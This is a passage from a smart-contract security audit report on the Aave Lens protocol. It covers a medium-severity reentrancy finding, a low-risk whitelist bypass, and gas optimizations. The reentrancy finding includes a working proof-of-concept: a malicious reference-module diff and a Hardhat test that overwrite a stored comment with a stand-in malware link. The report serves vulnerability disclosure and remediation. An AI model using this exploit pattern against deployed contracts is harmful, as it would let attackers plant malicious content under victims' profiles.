commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/30#issuecomment-1118566774):**\n > In light of another issue, I will mark this as a valid issue because [#66](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/66) outlines a similar concern. The two issues reference different parts of the codebase so I think its fair to keep them distinct. However, I'd normally like to see a bit more detail on how non-whitelisted users can benefit from an infinite minter.\n\n\n\n***\n\n## [[M-13] Reentrancy allows commenter to overwrite own comments](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/45)\n_Submitted by IllIllI_\n\nSince the Lens platform is a blockchain-based social media platform, it's important that information relevant to users be emitted so that light clients need not continually refer to the blockchain, which can be expensive. From the docs:\n\n`Events are emitted at every state-changing function call, in addition to standard ERC721 events. Events often include the timestamp as a specific parameter, which allows for direct consumption using a bloom filter without needing to fetch block context on every event.`\n\nAs such, it is important that the content of emitted events matches what direct lookups of publication data shows.\n\n### Impact\n\nDue to the reentrancy bug outlined below, an attacker is able to emit a comment containing some information that does not match the actual information of a post, allowing him/her to trick light clients into responding to a post that they otherwise would have avoided. The attacker can use this to propagate scams, serve malware, or otherwise poison other user's profiles with unwanted content. Because there is no way to disable publications after the fact, these commenters' profiles now link to this bad content forever.\n\n### Proof of Concept\n\nAccording to the developers in the contest discord, the intention is for the whitelisting of modules to eventually be disabled altogether, or moved to be controlled by a DAO. The main purpose of the whitelist is to make sure that the modules written and used by everyone are built and scoped appropriately, not to limit calls to outside contracts (i.e. the module does what it does in the most efficient manner, using the method requiring the fewest outside contract calls). As such it's reasonable to assume that at some point in the future, an attacker will be able to find or write a ReferenceModule that enables him/her to trigger a function in a contract he/she owns (e.g. transfer an NFT, triggering an ERC721 pre-transfer approval check callback). Below is a version of this where, for simplicity's sake, the malicious code is directly in the module rather than being called by a callback somehow.\n\n```diff\ndiff --git a/MockReferenceModule.sol.original b/MockReferenceModule.sol\nindex 2552faf..0fe464b 100644\n--- a/MockReferenceModule.sol.original\n+++ b/MockReferenceModule.sol\n@@ -3,23 +3,46 @@\n pragma solidity 0.8.10;\n \n import {IReferenceModule} from '../interfaces/IReferenceModule.sol';\n-\n+import {ILensHub} from '../interfaces/ILensHub.sol';\n+import {DataTypes} from '../libraries/DataTypes.sol';\n contract MockReferenceModule is IReferenceModule {\n     function initializeReferenceModule(\n         uint256 profileId,\n         uint256 pubId,\n         bytes calldata data\n-    ) external pure override returns (bytes memory) {\n+    ) external override returns (bytes memory) {\n         uint256 number = abi.decode(data, (uint256));\n         require(number == 1, 'MockReferenceModule: invalid');\n+        l = msg.sender;\n         return new bytes(0);\n     }\n \n+    address l;\n+    bool a;\n     function processComment(\n         uint256 profileId,\n         uint256 profileIdPointed,\n         uint256 pubIdPointed\n-    ) external override {}\n+    ) external override {\n+        if (a) return;\n+        a = true;\n+        bytes memory garbage;\n+        string memory handle = \"attack.eth\";\n+        uint256 pid = ILensHub(l).getProfileIdByHandle(handle);\n+        ILensHub(l).comment(\n+            DataTypes.CommentData(\n+                profileId,\n+                // make their comment and thus their profile link\n+                // to our malicious payload\n+                \"https://yourCommentIsNowOnALinkToMalware.com/forever\",\n+                profileIdPointed,\n+                pubIdPointed,\n+                ILensHub(l).getCollectModule(profileIdPointed, pubIdPointed),\n+                garbage,\n+                address(0x0),\n+                garbage\n+        ));\n+    }\n \n     function processMirror(\n         uint256 profileId,\n```\n\nAs for triggering the actual attack, the attacker first acquires a profile with a lot of followers either by organically growing a following, stealing a profile's NFT, or buying access to one. Next, the attacker publishes interesting content with the malicious ReferenceModule, and finally, the attacker publishes an extremely engaging/viral comment to that publication, which will cause lots of other people to respond to it. The comment will emit an event that contains the original comment information, but the module will be able to overwrite the actual published comment on the blockchain with the attacker's alternate content due to a reentrancy bug where the `pubCount` can be overwritten:\n\n```solidity\n    function _createComment(DataTypes.CommentData memory vars) internal {\n        PublishingLogic.createComment(\n            vars,\n            _profileById[vars.profileId].pubCount + 1,\n            _profileById,\n            _pubByIdByProfile,\n            _collectModuleWhitelisted,\n            _referenceModuleWhitelisted\n        );\n        _profileById[vars.profileId].pubCount++;\n    }\n```\n\n[LensHub.sol#L878-L888](https://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/LensHub.sol#L878-L888)<br>\n\nThe following test uses this altered module and shows that the attacker can emit a different comment than is actually stored by/used for subsequent comments:\n\n```diff\ndiff --git a/publishing-comments.spec.ts.original b/publishing-comments.spec.ts\nindex 471ba68..32dfb3a 100644\n--- a/publishing-comments.spec.ts.original\n+++ b/publishing-comments.spec.ts\n@@ -3,6 +3,11 @@ import { expect } from 'chai';\n import { MAX_UINT256, ZERO_ADDRESS } from '../../helpers/constants';\n import { ERRORS } from '../../helpers/errors';\n import { cancelWithPermitForAll, getCommentWithSigParts } from '../../helpers/utils';\n+import {\n+  getTimestamp,\n+  matchEvent,\n+  waitForTx,\n+} from '../../helpers/utils';\n import {\n   abiCoder,\n   emptyCollectModule,\n@@ -59,7 +64,7 @@ makeSuiteCleanRoom('Publishing Comments', function () {\n         })\n       ).to.not.be.reverted;\n     });\n-\n+/**\n     context('Negatives', function () {\n       it('UserTwo should fail to publish a comment to a profile owned by User', async function () {\n         await expect(\n@@ -151,8 +156,9 @@ makeSuiteCleanRoom('Publishing Comments', function () {\n         ).to.be.revertedWith(ERRORS.PUBLICATION_DOES_NOT_EXIST);\n       });\n     });\n-\n+/**/\n     context('Scenarios', function () {\n+/**\n       it('User should create a comment with empty collect module data, reference module, and reference module data, fetched comment data should be accurate', async function () {\n         await expect(\n           lensHub.comment({\n@@ -175,8 +181,23 @@ makeSuiteCleanRoom('Publishing Comments', function () {\n         expect(pub.collectNFT).to.eq(ZERO_ADDRESS);\n         expect(pub.referenceModule).to.eq(ZERO_ADDRESS);\n       });\n-\n+/**/\n       it('User should create a post using the mock reference module as reference module, then comment on that post', async function () {\n+\n+        // user acquires account and sets up the attacking profile\n+        await expect(\n+          lensHub.createProfile({\n+            to: mockReferenceModule.address,\n+            handle: \"attack.eth\",\n+            imageURI: MOCK_PROFILE_URI,\n+            followModule: ZERO_ADDRESS,\n+            followModuleData: [],\n+            followNFTURI: MOCK_FOLLOW_NFT_URI,\n+          })\n+        ).to.not.be.reverted;\n+        await lensHub.setDispatcher(FIRST_PROFILE_ID, mockReferenceModule.address);\n+\n+        // create a post\n         const data = abiCoder.encode(['uint256'], ['1']);\n         await expect(\n           lensHub.post({\n@@ -189,22 +210,43 @@ makeSuiteCleanRoom('Publishing Comments', function () {\n           })\n         ).to.not.be.reverted;\n \n-        await expect(\n+        // create extremely interesting bait comment\n+        const BAIT_COMMENT = \"https://somethingExtremelyInteresting.com/toGetEngagement\";\n+        let receipt = await waitForTx(\n           lensHub.comment({\n             profileId: FIRST_PROFILE_ID,\n-            contentURI: MOCK_URI,\n+            contentURI: BAIT_COMMENT,\n             collectModule: emptyCollectModule.address,\n             collectModuleData: [],\n             profileIdPointed: FIRST_PROFILE_ID,\n             pubIdPointed: 2,\n             referenceModule: ZERO_ADDRESS,\n             referenceModuleData: [],\n-          })\n-        ).to.not.be.reverted;\n+          },{gasLimit:12450000})\n+        );\n+\n+        // see the bait in the emitted event...\n+        matchEvent(receipt, 'CommentCreated', [\n+          FIRST_PROFILE_ID,\n+          3, // pubId 3 for profile 1\n+          BAIT_COMMENT, // <-- correct bait in the event\n+          FIRST_PROFILE_ID,\n+          2,\n+          emptyCollectModule.address,\n+          [],\n+          ZERO_ADDRESS,\n+          [],\n+          await getTimestamp(),\n+        ]);\n+\n+        // ...but malware when read, commented, or referenced\n+        let pub = await lensHub.getPub(FIRST_PROFILE_ID, 3);\n+        await expect(pub.contentURI)\n+          .to.equal(BAIT_COMMENT);\n       });\n     });\n   });\n-\n+/**\n   context('Meta-tx', function () {\n     beforeEach(async function () {\n       await expect(\n@@ -567,5 +609,5 @@ makeSuiteCleanRoom('Publishing Comments', function () {\n         expect(pub.referenceModule).to.eq(ZERO_ADDRESS);\n       });\n     });\n-  });\n+  });/**/\n });\n```\n\nAfter applying the above changes, running `npm test test/hub/interactions/publishing-comments.spec.ts` yields:\n\n```diff\n\n  Publishing Comments\n    Generic\n      Scenarios\n        1) User should create a post using the mock reference module as reference module, then comment on that post\n\n\n  0 passing (19s)\n  1 failing\n\n  1) Publishing Comments\n       Generic\n         Scenarios\n           User should create a post using the mock reference module as reference module, then comment on that post:\n\n      AssertionError: expected 'https://yourCommentIsNowOnALinkToMalware.com/forever' to equal 'https://somethingExtremelyInteresting.com/toGetEngagement'\n      + expected - actual\n\n      -https://yourCommentIsNowOnALinkToMalware.com/forever\n      +https://somethingExtremelyInteresting.com/toGetEngagement\n      \n      at Context.<anonymous> (test/hub/interactions/publishing-comments.spec.ts:245:15)\n      at processTicksAndRejections (internal/process/task_queues.js:97:5)\n      at runNextTicks (internal/process/task_queues.js:66:3)\n      at listOnTimeout (internal/timers.js:523:9)\n      at processTimers (internal/timers.js:497:7)\n\n```\n\nAnyone that has commented on the engaging comment now has unwittingly commented on a malicious URI, potentially encouraging others to visit the URI.\n\n### Tools Used\n\nCode inspection\nHardhat\n\n### Recommended Mitigation Steps\n\nStore the new `pubCount` in a variable before the comment is created and use it during the creation rather than choosing it afterwards.\n\n**[Zer0dot (Aave Lens) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/45#issuecomment-1072763598):**\n > This is valid and interesting! Especially because it can be attributed to incompetence instead of maliciousness on behalf of governance whitelisting a faulty module (which can also lead to loss of funds, etc). However, this does emit *multiple* events with the same publication ID, and thus I believe UIs can filter it, if ever it becomes an issue.\n> \n> On that front, the mitigation introduces another issue in that incrementing the pubId before creating the comment allows a comment to comment on itself. Paging @miguelmtzinf, wdyt? Also paging @donosonaumczuk.\n\n**[Zer0dot (Aave Lens) acknowledged and commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/45#issuecomment-1079380448):**\n > We acknowledge this and will not be acting on it. I think it's fair to say that if such a vulnerability is found, the double event emission can be a red flag, and governance can act promptly to unwhitelist the specific module. Note that there's already nothing stopping malware or illegal content links from appearing on UIs, who already need to do filtering. Still, this is valid!\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/45#issuecomment-1116615338):**\n > Upon first glance, this seems to be valid. An attacker could emit multiple events for a given comment, tricking light clients into responding to a potentially malicious post. However, it requires that reference modules are no longer whitelisted, allowing anyone to register a dodgy module or the governance accidentally registers a faulty module. I think for these reasons, I am more inclined to mark this as `medium` as it requires certain assumptions. While I understand C4 typically judges high severity issues as resulting in a loss of funds, Aave Lens is unique in that funds aren't paramount to how the protocol is intended to be used. I am open to further discussion if you disagree with me in any way @Zer0dot?\n\n**[Zer0dot (Aave Lens) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/45#issuecomment-1118624621):**\n > I wouldn't put it beyond the realm of possibility to see governance accidentally whitelist a module where this is possible. I do agree it's valid, medium sounds fine to me.\n\n**[0xleastwood (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/45#issuecomment-1119019232):**\n > Sweet, I'll downgrade this to `medium` considering we are both in agreement.\n\n\n\n***\n\n# Low Risk and Non-Critical Issues\n\nFor this contest, 14 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/66) by **WatchPug** received the top score from the judge.\n\n*The following wardens also submitted reports: [Dravee](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/60), [pauliax](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/82), [defsec](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/73), [csanuragjain](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/18), [hubble](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/64), [gzeon](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/80), [cccz](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/15), [hyh](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/87), [sikorico](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/16), [0xwags](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/85), [0x0x0x](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/40), [0x1f8b](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/49), and [kenta](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/54).*\n\n## [L-01] `ApprovalFollowModule.sol` lack of transfer check make it possible for anyone to become follower without approved by the profile owner\n\nPer the comment in `ApprovalFollowModule`, it aims to create a whitelist system:\n\n> This follow module only allows addresses that are approved for a profile by the profile owner to follow.\n\nHowever, the current implementation only validates if `_approvedByProfileByOwner` when minting a new `followNFT`. But since the `follow` relationship is verified by the `followNFT` and the `followNFT` can be transferred to an arbitrary address.\n\nAs a result, a non-whitelisted address can bypass the whitelist by buying the `followNFT` from a whitelisted address.\n\nThe `followModuleTransferHook` can be used for blocking transfers to unapproved addresses.\n\n[FollowValidatorFollowModuleBase.sol#L23-L38](https://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/modules/follow/FollowValidatorFollowModuleBase.sol#L23-L38)<br>\n\n```solidity\nfunction validateFollow(\n        uint256 profileId,\n        address follower,\n        uint256 followNFTTokenId\n    ) external view override {\n        address followNFT = ILensHub(HUB).getFollowNFT(profileId);\n        if (followNFT == address(0)) revert Errors.FollowInvalid();\n        if (followNFTTokenId == 0) {\n            // check that follower owns a followNFT\n            if (IERC721(followNFT).balanceOf(follower) == 0) revert Errors.FollowInvalid();\n        } else {\n            // check that follower owns the specific followNFT\n            if (IERC721(followNFT).ownerOf(followNFTTokenId) != follower)\n                revert Errors.FollowInvalid();\n        }\n    }\n```\n\n### Proof of Concept\n\n1.  Alice created a private club and selected `ApprovalFollowModule` with 100 addresses of founding members and wanted to publish publications that can only be collected by those addresses;\n\n2.  Bob as founding members of Alice's private club, decides to sell his membership to Charlie by transfering the `followNFT` to Charlie, Charlie's address has never be approved by Alice, but he is now a `follower` in Alice's private club.\n\n### Recommended Mitigation Steps\n\nChange to:\n\n```solidity\n    function followModuleTransferHook(\n        uint256 profileId,\n        address from,\n        address to,\n        uint256 followNFTTokenId\n    ) external override {\n        address owner = IERC721(HUB).ownerOf(profileId);\n        if (!_approvedByProfileByOwner[owner][profileId][to])\n            revert Errors.FollowNotApproved();\n        _approvedByProfileByOwner[owner][profileId][to] = false; // prevents repeat follows\n    }\n```\n\n**[oneski (Aave Lens) disputed and commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/66#issuecomment-1042476748):**\n > This is by design. A more sophisticated module could implement non-transferable behavior or allow transfer only to approved addresses.\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/66#issuecomment-1118561892):**\n > IMO, this is a valid issue. If we want to strictly adhere to the whitelist, we should not allow whitelisted addresses to transfer NFTs to non-whitelisted addresses. This limits the formation of secondary markets where users can bypass whitelist restrictions.\n\n**[Zer0dot (Aave Lens) disagreed with Medium severity and commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/66#issuecomment-1125577120):**\n > Unfortunately transferrability is in the nature of the protocol. The module's purpose is not to limit follows to only whitelisted wallets (as this is impossible to guarantee in case follow NFTs existed previously, though one could use the validation function etc). Rather, the goal of this module is simply to only allow whitelisted users to mint follow NFTs, what they do with them is up to them. \n> \n> Due to the confusing nature of the module, I would not dispute this but I would still disagree that it's a medium severity issue, I would mark it as low.\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/66#issuecomment-1126113275):**\n > So if I'm understanding this correctly, whitelisted users who mint follow NFTs are free to do whatever with those, whether they sell them to other parties or give them away. It's completely up to them?\n>\n> If that's the case, I'll agree and mark this as QA.\n\n**[Zer0dot (Aave Lens) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/66#issuecomment-1126121278):**\n > Yeah although it's valid enough, this is just how the module works.\n\n**[0xleastwood (judge) decreased severity to Low and commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/66#issuecomment-1126126555):**\n > Okay, QA it is, good ser.\n\n\n\n***\n\n# Gas Optimizations\n\nFor this contest, 12 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/47) by **Dravee** received the top score from the judge.\n\n*The following wardens also submitted reports: [IllIllI](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/44), [Jujic](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/56), [0x0x0x](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/41), [csanuragjain](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/17), [defsec](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/74), [nahnah](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/75), [d4rk](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/13), [rfa](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/84), [pauliax](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/83), [gzeon](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/79), and [0x1f8b](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/39).*\n\n## Table of Contents\n\nSee [original submission](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/47).\n\n## Foreword\n\n*   **`@audit` tags**\n\n> The code is annotated at multiple places with `//@audit` comments to pinpoint the issues. Please, pay attention to them for more details.\n\n## File: FollowNFT.sol\n\n### function getPowerByBlockNumber()\n\n#### Unchecked block\n\n    116:         if (snapshotCount == 0) {\n    117:             return 0; // Returning zero since this means the user never delegated and has no power\n    118:         }\n    119: \n    120:         uint256 lower = 0;\n    121:         uint256 upper = snapshotCount - 1; //@audit uncheck (see condition L116)\n\nAs it's impossible for line 121 to underflow (see condition line 116), it should be wrapped inside an `unchecked` block.\n\n### function getDelegatedSupplyByBlockNumber()\n\n#### Unchecked block\n\n    158:         if (snapshotCount == 0) {\n    159:             return 0; // Returning zero since this means a delegation has never occurred\n    160:         }\n    161: \n    162:         uint256 lower = 0;\n    163:         uint256 upper = snapshotCount - 1; //@audit uncheck (see condition line 158)\n\nAs it's impossible for line 163 to underflow (see condition line 158), it should be wrapped inside an `unchecked` block.\n\n## File: LensHub.sol\n\n### modifier onlyWhitelistedProfileCreator() {\n\n#### A modifier used only once can get inline to save gas\n\nThe `modifier onlyWhitelistedProfileCreator` is used only once:\n\n    File: LensHub.sol\n    142:     function createProfile(DataTypes.CreateProfileData calldata vars)\n    143:         external\n    144:         override\n    145:         whenNotPaused\n    146:         onlyWhitelistedProfileCreator\n    147:     {\n\nTherefore, it can get inlined in `createProfile` to save gas\n\n### function setState()\n\n    95:     function setState(DataTypes.ProtocolState newState) external override {\n    96:         if (msg.sender != _governance && msg.sender != _emergencyAdmin) //@audit gas: this is a sad path with always 2 SLOADs. There's a happy path.\n    97:             revert Errors.NotGovernanceOrEmergencyAdmin();\n    98:         _setState(newState);\n    99:     }\n\n#### Short-circuiting can provide a happy path\n\nThe current implementation of function `setState` favors a **sad path** which will always cost **2 SLOADs** to check the condition.\nIt's possible to **short-circuit** this condition to provide a **happy path** which may cost **only 1 SLOAD** instead.\nI suggest rewriting the function to:\n\n        function setState(DataTypes.ProtocolState newState) external override {\n            if (msg.sender == _governance || msg.sender == _emergencyAdmin) { //@audit-info happy path. Use as 1st condition the most frequent one (here, we assume _governance calls this method the most often)\n              _setState(newState);\n            } else {\n              revert Errors.NotGovernanceOrEmergencyAdmin();\n            }\n        }\n\nAnother alternative:\n\n        function setState(DataTypes.ProtocolState newState) external override {\n            if (msg.sender == _governance || msg.sender == _emergencyAdmin) {\n              _setState(newState);\n              return;\n            }\n            revert Errors.NotGovernanceOrEmergencyAdmin();\n        }\n\n### function getProfileIdByHandle()\n\n    794:     function getProfileIdByHandle(string calldata handle) external view override returns (uint256) {\n    795:         bytes32 handleHash = keccak256(bytes(handle)); //@audit gas: var used only once, inline it\n    796:         return _profileIdByHandleHash[handleHash];\n    797:     }\n\n#### A variable used only once shouldn't get cached\n\nI suggest inlining `handleHash` L796.\n\n### function \\_createPost()\n\n    856:     function _createPost(\n    857:         uint256 profileId,\n    858:         string memory contentURI, //@audit gas: should be calldata (calls L333 and L374 are passing a calldata variable)\n    859:         address collectModule,\n    860:         bytes memory collectModuleData, //@audit gas: should be calldata (calls L335 and L376 are passing a calldata variable)\n    861:         address referenceModule,\n    862:         bytes memory referenceModuleData //@audit gas: should be calldata (calls L337 and L378 are passing a calldata variable)\n    863:     ) internal {\n\n#### Use `calldata` instead of `memory` for `string contentURI`\n\n#### Use `calldata` instead of `memory` for `bytes collectModuleData`\n\n#### Use `calldata` instead of `memory` for `bytes referenceModuleData`\n\nFor the 3 `memory` variables declared in `_createPost()`, the parent functions are actually passing a `calldata` variable:\n\n    329:     function post(DataTypes.PostData calldata vars) external override whenPublishingEnabled { //@audit-info vars is using calldata\n    330:         _validateCallerIsProfileOwnerOrDispatcher(vars.profileId);\n    331:         _createPost(\n    332:             vars.profileId,\n    333:             vars.contentURI, //@audit-info calldata\n    334:             vars.collectModule,\n    335:             vars.collectModuleData, //@audit-info calldata\n    336:             vars.referenceModule,\n    337:             vars.referenceModuleData //@audit-info calldata\n    338:         );\n    339:     }\n    ...\n    342:     function postWithSig(DataTypes.PostWithSigData calldata vars) //@audit-info vars is using calldata\n    343:         external\n    344:         override\n    345:         whenPublishingEnabled\n    346:     {\n    ...\n    372:         _createPost(\n    373:             vars.profileId,\n    374:             vars.contentURI, //@audit-info calldata\n    375:             vars.collectModule,\n    376:             vars.collectModuleData, //@audit-info calldata\n    377:             vars.referenceModule,\n    378:             vars.referenceModuleData //@audit-info calldata\n    379:         );\n\nTherefore, the function declaration should use `calldata` instead of `memory` for these 3 parameters.\n\nThis optimization is similar to the one for the `internal` function `_createMirror`in `LensNFTBase.sol` which uses `bytes calldata referenceModuleData`:\n\n    File: LensHub.sol\n    890:     function _createMirror(\n    891:         uint256 profileId,\n    892:         uint256 profileIdPointed,\n    893:         uint256 pubIdPointed,\n    894:         address referenceModule,\n    895:         bytes calldata referenceModuleData //@audit-ok : calldata on internal because parent function passes a calldata variable\n    896:     ) internal {\n\n### function \\_setFollowNFTURI()\n\n    919:     function _setFollowNFTURI(uint256 profileId, string memory followNFTURI) internal { //@audit gas: should be calldata (calls L255 and L285 are passing a calldata variable)\n    920:         _profileById[profileId].followNFTURI = followNFTURI;\n    921:         emit Events.FollowNFTURISet(profileId, followNFTURI, block.timestamp);\n    922:     }\n\n#### Use `calldata` instead of `memory` for `string followNFTURI`\n\nThe parent functions are actually passing a `calldata` variable:\n\n    289:     function setFollowNFTURI(uint256 profileId, string calldata followNFTURI) //@audit-info calldata\n    290:         external\n    291:         override\n    292:         whenNotPaused\n    293:     {\n    294:         _validateCallerIsProfileOwnerOrDispatcher(profileId);\n    295:         _setFollowNFTURI(profileId, followNFTURI); //@audit-info calldata\n    296:     }\n    ...\n    299:     function setFollowNFTURIWithSig(DataTypes.SetFollowNFTURIWithSigData calldata vars) //@audit-info calldata\n    300:         external\n    301:         override\n    302:         whenNotPaused\n    303:     {\n    ...\n    325:         _setFollowNFTURI(vars.profileId, vars.followNFTURI); //@audit-info calldata\n    326:     }\n\nTherefore, the function declaration should use `calldata` instead of `memory` for `string followNFTURI`\n\nThis optimization is similar to the one for the `internal` function `_createMirror`in `LensNFTBase.sol` which uses `bytes calldata referenceModuleData`.\n\n### function \\_validateCallerIsProfileOwnerOrDispatcher()\n\n    940:     function _validateCallerIsProfileOwnerOrDispatcher(uint256 profileId) internal view {\n    941:         if (msg.sender != ownerOf(profileId) && msg.sender != _dispatcherByProfile[profileId]) //@audit gas: this is a sad path with 2 SLOADs. A happy path is possible\n    942:             revert Errors.NotProfileOwnerOrDispatcher();\n    943:     }\n\n#### Short-circuiting can provide a happy path\n\nThe current implementation of function `_validateCallerIsProfileOwnerOrDispatcher` favors a **sad path** which will always cost **2 SLOADs** to check the condition.\nIt's possible to **short-circuit** this condition to provide a **happy path** which may cost **only 1 SLOAD** instead.\nI suggest rewriting the function to:\n\n        function _validateCallerIsProfileOwnerOrDispatcher(uint256 profileId) internal view {\n            if (msg.sender == ownerOf(profileId) || msg.sender == _dispatcherByProfile[profileId]) {\n              return;\n            }\n            revert Errors.NotProfileOwnerOrDispatcher();\n        }\n\n## File: LensNFTBase.sol\n\n### function \\_validateRecoveredAddress()\n\n    159:     function _validateRecoveredAddress(\n    160:         bytes32 digest,\n    161:         address expectedAddress,\n    162:         DataTypes.EIP712Signature memory sig //@audit gas: should be calldata (calls L78, L111 and L152 are passing a calldata variable)\n    163:     ) internal view {\n\n#### Use `calldata` instead of `memory`\n\nThe calls to the `internal` function `_validateRecoveredAddress` pass a `calldata` variable:\n\n    51:     function permit(\n    52:         address spender,\n    53:         uint256 tokenId,\n    54:         DataTypes.EIP712Signature calldata sig //@audit-info calldata\n    55:     ) external override {\n    ...\n    78:         _validateRecoveredAddress(digest, owner, sig); //@audit-info calldata\n    ...\n    83:     function permitForAll(\n    84:         address owner,\n    85:         address operator,\n    86:         bool approved,\n    87:         DataTypes.EIP712Signature calldata sig //@audit-info calldata\n    88:     ) external override {\n    ...\n    111:         _validateRecoveredAddress(digest, owner, sig); //@audit-info calldata\n    ...\n    127:     function burnWithSig(uint256 tokenId, DataTypes.EIP712Signature calldata sig) //@audit-info calldata\n    ...\n    152:         _validateRecoveredAddress(digest, owner, sig); //@audit-info calldata\n\nTherefore, the function declaration should use `calldata` instead of `memory`\n\nThis optimization is similar to the one for the `internal` function `_createMirror`in `LensNFTBase.sol` which uses `bytes calldata referenceModuleData`.\n\n## File: PublishingLogic.sol\n\n### function \\_initFollowModule()\n\n    342:     function _initFollowModule(\n    343:         uint256 profileId,\n    344:         address followModule,\n    345:         bytes memory followModuleData, //@audit gas: should be calldata (calls L64 and L95 are passing a calldata variable)\n    346:         mapping(address => bool) storage _followModuleWhitelisted\n    347:     ) private returns (bytes memory) {\n\n#### Use `calldata` instead of `memory`\n\nThe calls to the `private` function `_initFollowModule` pass a `calldata` variable:\n\n    39:     function createProfile(\n    40:         DataTypes.CreateProfileData calldata vars, //@audit-info calldata\n    ...\n    61:         bytes memory followModuleReturnData = _initFollowModule(\n    62:             profileId,\n    63:             vars.followModule,\n    64:             vars.followModuleData, //@audit-info calldata\n    65:             _followModuleWhitelisted\n    66:         );\n    ...\n    80:     function setFollowModule(\n    81:         uint256 profileId,\n    82:         address followModule,\n    83:         bytes calldata followModuleData, //@audit-info calldata\n    ...\n    92:         bytes memory followModuleReturnData = _initFollowModule(\n    93:             profileId,\n    94:             followModule,\n    95:             followModuleData, //@audit-info calldata\n    96:             _followModuleWhitelisted\n    97:         );\n\nTherefore, the function declaration should use `calldata` instead of `memory`\n\nThis optimization is similar to the one for the `internal` function `_createMirror`in `LensNFTBase.sol` which uses `bytes calldata referenceModuleData`.\n\n## General recommendations\n\n### Variables\n\n#### No need to explicitly initialize variables with default values\n\nIf a variable is not set/initialized, it is assumed to have the default value (`0` for `uint`, `false` for `bool`, `address(0)` for address...). Explicitly initializing it with its default value is an anti-pattern and wastes gas.\n\nAs an example: `for (uint256 i = 0; i < numIterations; ++i) {` should be replaced with `for (uint256 i; i < numIterations; ++i) {`\n\nInstances include:\n\n    core\\modules\\follow\\ApprovalFollowModule.sol:41:        for (uint256 i = 0; i < addresses.length; ++i) {\n    core\\modules\\follow\\ApprovalFollowModule.sol:66:            for (uint256 i = 0; i < addresses.length; ++i) {\n    core\\modules\\follow\\ApprovalFollowModule.sol:128:        for (uint256 i = 0; i < toCheck.length; ++i) {\n    core\\FollowNFT.sol:120:        uint256 lower = 0;\n    core\\FollowNFT.sol:162:        uint256 lower = 0;\n    core\\LensHub.sol:541:        for (uint256 i = 0; i < vars.datas.length; ++i) {\n    libraries\\InteractionLogic.sol:47:        for (uint256 i = 0; i < profileIds.length; ++i) {\n    libraries\\PublishingLogic.sol:403:        for (uint256 i = 0; i < byteHandle.length; ++i) {\n    upgradeability\\VersionedInitializable.sol:29:    uint256 private lastInitializedRevision = 0;\n\nI suggest removing explicit initializations for default values.\n\n#### Pre-increments cost less gas compared to post-increments\n\nAs the solution employs pre-increments for all of its for-loops, I'm sure the sponsor is aware of the fact that pre-increments cost less gas compared to post-increments (about 5 gas)\n\nHowever, some places outside loops were missed.\n\nInstances include:\n\n    core\\modules\\collect\\LimitedFeeCollectModule.sol:112:            _dataByPublicationByProfile[profileId][pubId].currentCollects++;\n    core\\modules\\collect\\LimitedTimedFeeCollectModule.sol:123:            _dataByPublicationByProfile[profileId][pubId].currentCollects++;\n    core\\LensHub.sol:887:        _profileById[vars.profileId].pubCount++;\n\nI suggest only replacing these, as some other places in the solution are actually using post-increments the right way. The logic would break if those other places (not mentioned here) are changed too.\n\n### For-Loops\n\n#### Increments can be unchecked\n\nIn Solidity 0.8+, there's a default overflow check on unsigned integers. It's possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline.\n\n[ethereum/solidity#10695](https://github.com/ethereum/solidity/issues/10695)\n\nInstances include:\n\n    core\\modules\\follow\\ApprovalFollowModule.sol:41:        for (uint256 i = 0; i < addresses.length; ++i) {\n    core\\modules\\follow\\ApprovalFollowModule.sol:66:            for (uint256 i = 0; i < addresses.length; ++i) {\n    core\\modules\\follow\\ApprovalFollowModule.sol:128:        for (uint256 i = 0; i < toCheck.length; ++i) {\n    core\\LensHub.sol:541:        for (uint256 i = 0; i < vars.datas.length; ++i) {\n    libraries\\InteractionLogic.sol:47:        for (uint256 i = 0; i < profileIds.length; ++i) {\n    libraries\\PublishingLogic.sol:403:        for (uint256 i = 0; 